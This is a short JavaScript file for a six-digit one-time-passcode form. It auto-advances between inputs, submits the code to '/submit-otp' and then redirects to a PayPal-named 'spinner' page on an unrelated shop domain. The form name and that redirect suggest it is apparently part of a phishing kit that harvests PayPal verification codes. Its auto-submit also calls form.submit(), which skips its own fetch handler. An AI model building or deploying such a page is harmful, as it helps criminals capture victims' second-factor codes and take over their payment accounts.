document.addEventListener("DOMContentLoaded", function() {
    const otpInputs = document.querySelectorAll('.otp-container input[type="text"]');
    const form = document.getElementById('paypotpform');

    // Function to move focus to next input
    function moveToNextInput(element) {
        const nextInput = element.nextElementSibling;
        if (nextInput && nextInput.tagName === "INPUT") {
            nextInput.focus();
        }
    }

    // Function to check if all inputs are filled
    function checkIfAllFilled() {
        const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
        if (allFilled) {
            form.submit();
        }
    }

    // Event listener for each OTP input
    otpInputs.forEach(input => {
        input.addEventListener('input', function(e) {
            // Allow only numbers
            this.value = this.value.replace(/[^0-9]/g, '');
            // Move to next field if this one is filled
            if (this.value.length === 1) {
                moveToNextInput(this);
            }
            // Check if all fields are filled
            checkIfAllFilled();
        });
    });

    // Event listener to prevent default form submission and to handle the AJAX submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Combine the values from each input
        const otpValue = Array.from(otpInputs).map(input => input.value).join('');

        // Adjust the fetch call according to your API
        fetch('/submit-otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `otp=${otpValue}`
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json(); // Assuming the response is JSON. Adjust if necessary.
        })
        .then(data => {
            // Handle success - Redirecting to another page upon successful OTP submission
            window.location.href = 'https://shop.smile-actives.co/spinner-paypal3.html'; // Adjust the URL as needed
        })
        .catch(error => {
            // Handle errors here, such as showing an error message to the user
            console.error('Error:', error);
        });
    });

    // Assuming you have a way to get the OTP, you would call a function like this:
    // This is just an example and would need to be implemented according to your actual logic
    function autofillOtp(otp) {
        if(otp.length === 6) {
            otp.split('').forEach((num, index) => {
                otpInputs[index].value = num;
            });
            checkIfAllFilled();
        }
    }

    // Example usage:
    // autofillOtp('123456'); // This should be replaced with the actual OTP value you receive
});
